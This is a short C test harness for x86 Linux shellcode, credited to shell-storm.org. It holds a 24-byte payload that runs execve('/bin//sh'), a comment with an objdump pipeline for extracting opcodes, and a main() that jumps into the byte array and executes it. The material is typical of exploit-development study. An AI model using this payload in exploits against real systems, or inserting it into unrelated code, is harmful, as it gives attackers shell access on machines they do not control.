#include<stdio.h>
#include<string.h>

/* objdump -d ./sh.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' */

// http://shell-storm.org/shellcode/files/shellcode-827.php

// size = 24 bytes

unsigned char code[] = \
"\xeb\x09\x31\xc9\xf7\xe1\xb0\x0b\x5b\xcd\x80\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();

	return 0;

}

	
